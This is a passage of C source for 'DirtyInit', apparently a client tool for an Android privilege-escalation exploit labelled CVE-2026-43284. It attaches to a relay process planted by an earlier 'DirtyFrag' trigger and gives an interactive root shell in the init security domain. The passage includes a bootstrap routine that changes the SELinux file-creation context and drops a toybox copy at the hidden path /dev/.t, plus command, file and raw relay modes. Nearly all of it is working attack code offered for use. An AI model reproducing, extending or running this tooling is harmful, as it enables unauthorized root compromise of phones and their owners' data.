                printf("root@%s:%s # ", g_domain_label, g_cwd);
                fflush(stdout);
                continue;
            }

            int rc = dispatch_line(&relay_sock, line_buf);

            if (rc == DISPATCH_EXIT) {
                printf("Connection closed.\n");
                fflush(stdout);
                break;
            }

            if (relay_sock < 0) {
                printf("[proxy] Relay connection lost.\n");
                fflush(stdout);
                break;
            }

            printf("root@%s:%s # ", g_domain_label, g_cwd);
            fflush(stdout);
        }

        /* Restore stdout/stderr to originals */
        dup2(orig_stdout, STDOUT_FILENO);
        dup2(orig_stderr, STDERR_FILENO);
        close(client_fd);

        /* If relay died, proxy must exit — next invocation starts fresh */
        if (relay_sock < 0) break;
    }

    close(listen_fd);
    close(relay_sock);
    close(orig_stdout);
    close(orig_stderr);
}

/* (mux removed — proxy architecture replaces it) */

/* ── Remaining helpers: do_bootstrap, connect_and_identify ── */

/* Forward: connect_and_identify needs the commands table */
static int do_bootstrap(int sock) {
    printf("[*] Bootstrap: setting fscreate to tmpfs...\n");
    int64_t fsc_fd = relay_openat(sock, "/proc/self/attr/fscreate",
                                  MY_O_WRONLY | MY_O_TRUNC, 0);
    if (fsc_fd < 0) {
        fprintf(stderr, "[!] Cannot open fscreate: %s\n", errno_str((int)-fsc_fd));
        return 1;
    }
    const char *ctx = "u:object_r:tmpfs:s0";
    relay_write(sock, fsc_fd, ctx, strlen(ctx));
    relay_close(sock, fsc_fd);

    printf("[*] Bootstrap: copying toybox to /dev/.t ...\n");
    int s = sock;
    dispatch_line(&s, "cp /system/bin/toybox /dev/.t");

    printf("[*] Bootstrap: chmod 755 /dev/.t ...\n");
    dispatch_line(&s, "chmod 755 /dev/.t");

    printf("[*] Verifying...\n");
    dispatch_line(&s, "stat /dev/.t");
    dispatch_line(&s, "id");

    return 0;
}

/* probe_existing_relay — non-blocking check for an already-running relay.
 *
 * On re-frag (second DirtyFrag trigger), the payload forks a new relay child.
 * But the relay child from the first frag may still be alive, holding the
 * @dfi_init abstract socket. This causes either port bind failure (new relay
 * can't start) or two relay children (zombie + live, client confusion).
 *
 * This function does a quick probe: connect to the abstract socket, send a
 * getuid syscall, and check for a valid response. If the relay is alive, the
 * caller can reuse it (no new frag needed). If the relay is dead or
 * unresponsive, the caller proceeds with a new frag.
 *
 * Returns:
 *   >= 0 : connected socket fd (relay is alive and responding)
 *   -1   : relay is not running or not responding (need new frag)
 */
static int probe_existing_relay(void) {
    int sock = socket(AF_UNIX, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    struct sockaddr_un addr;
    memset(&addr, 0, sizeof(addr));
    addr.sun_family = AF_UNIX;
    memcpy(addr.sun_path + 1, SOCKET_NAME, sizeof(SOCKET_NAME) - 1);
    socklen_t addrlen = (socklen_t)(2 + 1 + sizeof(SOCKET_NAME) - 1);

    if (connect(sock, (struct sockaddr *)&addr, addrlen) < 0) {
        /* No relay listening — expected on first run or after relay death */
        close(sock);
        return -1;
    }

    /* Socket connected — verify the relay is actually responsive by sending
     * a lightweight getuid syscall. A stale/zombie relay may accept connections
     * but not respond to protocol messages. */
    int64_t uid = send_syscall(sock, SYS_getuid, 0,0,0,0,0,0, 0, NULL,0, NULL,0);
    if (uid == INT64_MIN) {
        /* Connected but unresponsive — relay is likely desynchronized or zombie.
         * Close and let the caller proceed with a new frag. */
        shutdown(sock, SHUT_RDWR);
        close(sock);
        return -1;
    }

    /* Relay is alive and responding — return the connected socket for reuse */
    return sock;
}

static int connect_and_identify(int *sock_out, int quiet) {
    if (!quiet) printf("DirtyInit — CVE-2026-43284\n");

    /* ── Pre-flight: probe for an existing relay from a prior frag ──
     *
     * On re-frag, a relay child from the first frag may still be alive.
     * Try a quick non-blocking probe before the full connect_with_retry path.
     * If the relay is alive and responsive, reuse it — no new frag needed.
     * This prevents dual relay children (zombie + live, port conflicts). */
    if (!quiet) printf("Probing for existing relay at @%s...\n", SOCKET_NAME);
    int probe_sock = probe_existing_relay();
    if (probe_sock >= 0) {
        /* Relay from prior frag is still alive — reuse it */
        if (!quiet) printf("  Existing relay detected (reusing prior session)\n");

        int64_t pid = send_syscall(probe_sock, SYS_getpid, 0,0,0,0,0,0,
                                   0, NULL,0, NULL,0);
        if (pid == INT64_MIN) {
            /* Probe passed but getpid failed — relay is unstable, fall through */
            fprintf(stderr, "  Relay probe succeeded but getpid failed — reconnecting\n");
            shutdown(probe_sock, SHUT_RDWR);
            close(probe_sock);
            goto fresh_connect;
        }

        char init_context[128] = "u:r:init:s0";
        int64_t ctx_fd = relay_openat(probe_sock, "/proc/self/attr/current",
                                      MY_O_RDONLY, 0);
        if (ctx_fd >= 0) {
            uint8_t cbuf[128];
            memset(cbuf, 0, sizeof(cbuf));
            int64_t n = relay_read(probe_sock, ctx_fd, cbuf, sizeof(cbuf) - 1);
            relay_close(probe_sock, ctx_fd);
            if (n > 0) {
                cbuf[n] = '\0';
                if (n > 0 && cbuf[n-1] == '\n') cbuf[n-1] = '\0';
                strncpy(init_context, (char *)cbuf, sizeof(init_context) - 1);
            }
        }

        int64_t uid = send_syscall(probe_sock, SYS_getuid, 0,0,0,0,0,0,
                                   0, NULL,0, NULL,0);

        int cmd_count = 0;
        for (int i = 0; commands[i].name; i++) cmd_count++;

        if (!quiet) {
            printf("Reused existing relay: PID %lld, UID %lld, %s\n",
                   (long long)pid, (long long)(uid == INT64_MIN ? -1 : uid),
                   init_context);
            printf("  (No re-frag needed — relay from prior session is alive)\n");
            printf("%d commands available. Type 'help' for list.\n\n", cmd_count);
        }

        *sock_out = probe_sock;
        return 0;
    }

fresh_connect:
    /* No existing relay found — proceed with normal connect (requires frag) */
    if (!quiet) printf("No existing relay found. Connecting to @%s...\n", SOCKET_NAME);

    int sock = connect_with_retry();
    if (sock < 0) return 1;

    int64_t uid = send_syscall(sock, SYS_getuid, 0,0,0,0,0,0, 0, NULL,0, NULL,0);
    if (uid == INT64_MIN) {
        fprintf(stderr, "ERROR: relay not responding (getuid timeout)\n");
        shutdown(sock, SHUT_RDWR);
        close(sock);
        return 1;
    }

    int64_t pid = send_syscall(sock, SYS_getpid, 0,0,0,0,0,0, 0, NULL,0, NULL,0);
    if (pid == INT64_MIN) {
        fprintf(stderr, "ERROR: relay not responding (getpid timeout)\n");
        shutdown(sock, SHUT_RDWR);
        close(sock);
        return 1;
    }

    char init_context[128] = "u:r:init:s0";
    int64_t ctx_fd = relay_openat(sock, "/proc/self/attr/current", MY_O_RDONLY, 0);
    if (ctx_fd >= 0) {
        uint8_t cbuf[128];
        memset(cbuf, 0, sizeof(cbuf));
        int64_t n = relay_read(sock, ctx_fd, cbuf, sizeof(cbuf) - 1);
        relay_close(sock, ctx_fd);
        if (n > 0) {
            cbuf[n] = '\0';
            if (n > 0 && cbuf[n-1] == '\n') cbuf[n-1] = '\0';
            strncpy(init_context, (char *)cbuf, sizeof(init_context) - 1);
        }
    }

    int cmd_count = 0;
    for (int i = 0; commands[i].name; i++) cmd_count++;

    if (!quiet) {
        printf("Connected: PID %lld, UID %lld, %s\n",
               (long long)pid, (long long)uid, init_context);
        printf("%d commands available. Type 'help' for list.\n\n", cmd_count);
    }

    *sock_out = sock;
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Main — unified dfi + relay_client
 * ═══════════════════════════════════════════════════════════════════════════ */

int main(int argc_main, char *argv_main[]) {
    setvbuf(stdout, NULL, _IOLBF, 0);
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = sigint_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    sigaction(SIGINT, &sa, NULL);

    /* Zombie reaper: automatically reap child processes.
     * Block SIGALRM during SIGCHLD to prevent concurrent g_child_pids[] access. */
    struct sigaction sa_chld;
    memset(&sa_chld, 0, sizeof(sa_chld));
    sa_chld.sa_handler = sigchld_handler;
    sigemptyset(&sa_chld.sa_mask);
    sigaddset(&sa_chld.sa_mask, SIGALRM);  /* block SIGALRM while in SIGCHLD */
    sa_chld.sa_flags = SA_RESTART | SA_NOCLDSTOP;
    sigaction(SIGCHLD, &sa_chld, NULL);

    /* Watchdog: kill lingering children after alarm timeout.
     * Block SIGCHLD during SIGALRM to prevent concurrent g_child_pids[] access. */
    struct sigaction sa_alrm;
    memset(&sa_alrm, 0, sizeof(sa_alrm));
    sa_alrm.sa_handler = sigalrm_handler;
    sigemptyset(&sa_alrm.sa_mask);
    sigaddset(&sa_alrm.sa_mask, SIGCHLD);  /* block SIGCHLD while in SIGALRM */
    sa_alrm.sa_flags = 0;
    sigaction(SIGALRM, &sa_alrm, NULL);

    /* ── Argument parsing ── */
    enum { MODE_INTERACTIVE, MODE_COMMAND, MODE_BOOTSTRAP,
           MODE_FILE, MODE_RAW } mode = MODE_INTERACTIVE;
    const char *file_arg = NULL;
    int cmd_start = 0;

    if (argc_main > 1) {
        const char *a1 = argv_main[1];
        if (strcmp(a1, "-h") == 0 || strcmp(a1, "--help") == 0) {
            printf(
                "DirtyInit — init-domain shell via DFI relay\n"
                "\n"
                "Usage:\n"
                "  dirtyinit                    interactive shell (with readline if available)\n"
                "  dirtyinit <command> [args]    run single command\n"
                "  dirtyinit -b                 bootstrap (/dev/.t)\n"
                "  dirtyinit -f <file>          run commands from file\n"
                "  dirtyinit -r '<raw cmd>'     raw relay command\n"
                "  dirtyinit -h                 this help\n"
                "\n"
                "Examples:\n"
                "  dirtyinit ls -laZ /system/bin\n"
                "  dirtyinit cat /proc/1/status\n"
                "  dirtyinit setprop persist.test hello\n"
                "  dirtyinit -b\n"
            );
            return 0;
        } else if (strcmp(a1, "-i") == 0 || strcmp(a1, "--internal") == 0) {
            /* -i kept for backward compat — same as interactive */
            if (argc_main > 2) {
                mode = MODE_COMMAND;
                cmd_start = 2;
            }
        } else if (strcmp(a1, "-b") == 0 || strcmp(a1, "--bootstrap") == 0) {
            mode = MODE_BOOTSTRAP;
        } else if (strcmp(a1, "-f") == 0) {
            if (argc_main < 3) {
                fprintf(stderr, "error: -f requires a filename\n");
                return 1;
            }
            mode = MODE_FILE;
            file_arg = argv_main[2];
        } else if (strcmp(a1, "-r") == 0 || strcmp(a1, "--raw") == 0) {
            if (argc_main < 3) {
                fprintf(stderr, "error: -r requires a command\n");
                return 1;
            }
            mode = MODE_RAW;
            cmd_start = 2;
        } else {
            mode = MODE_COMMAND;
            cmd_start = 1;
        }
    }

    /* ── Connect to relay directly (all modes) ── */
    int is_tty = isatty(STDIN_FILENO);
    int quiet = (mode == MODE_COMMAND) || !is_tty;
    int sock;
    if (connect_and_identify(&sock, quiet) != 0) return 1;

    switch (mode) {

    case MODE_BOOTSTRAP:
        do_bootstrap(sock);
        shutdown(sock, SHUT_RDWR);
        close(sock);
        return 0;

    case MODE_COMMAND: {
        char combined[INPUT_BUF_SIZE];
        combined[0] = '\0';
        for (int i = cmd_start; i < argc_main; i++) {
            if (i > cmd_start) strncat(combined, " ", INPUT_BUF_SIZE - strlen(combined) - 1);
            strncat(combined, argv_main[i], INPUT_BUF_SIZE - strlen(combined) - 1);
        }
        dispatch_line(&sock, combined);
        shutdown(sock, SHUT_RDWR);
        close(sock);
        return 0;
    }

    case MODE_RAW: {
        char combined[INPUT_BUF_SIZE];
        combined[0] = '\0';
        for (int i = cmd_start; i < argc_main; i++) {
            if (i > cmd_start) strncat(combined, " ", INPUT_BUF_SIZE - strlen(combined) - 1);
            strncat(combined, argv_main[i], INPUT_BUF_SIZE - strlen(combined) - 1);
        }
        dispatch_line(&sock, combined);
        shutdown(sock, SHUT_RDWR);
        close(sock);
        return 0;
    }

    case MODE_FILE: {
        FILE *fp = fopen(file_arg, "r");
        if (!fp) {
            fprintf(stderr, "error: cannot open %s: %s\n", file_arg, strerror(errno));
            close(sock);
            return 1;
        }
        char line[INPUT_BUF_SIZE];
        while (fgets(line, sizeof(line), fp)) {
            char *t = trim(line);
            if (*t == '\0' || *t == '#') continue;
            printf(">> %s\n", t);
            int rc = dispatch_line(&sock, t);
            if (rc == DISPATCH_EXIT) break;
        }
        fclose(fp);
        shutdown(sock, SHUT_RDWR);
        close(sock);
        return 0;
    }

    case MODE_INTERACTIVE:
    default:
        break;
    }

    /* ── Interactive REPL — direct terminal I/O, no proxy ── */
    char input[INPUT_BUF_SIZE];

    for (;;) {
        if (is_tty) {
            printf("root@%s:%s # ", g_domain_label, g_cwd);
            fflush(stdout);
        }

        g_sigint = 0;

        if (fgets(input, sizeof(input), stdin) == NULL) {
            printf("\n");
            break;
        }

        if (g_sigint) {
            g_sigint = 0;
            printf("\n");
            continue;
        }

        int rc = dispatch_line(&sock, input);
        if (rc == DISPATCH_EXIT) break;
    }

    shutdown(sock, SHUT_RDWR);
    close(sock);
    printf("Connection closed.\n");
    return 0;
}
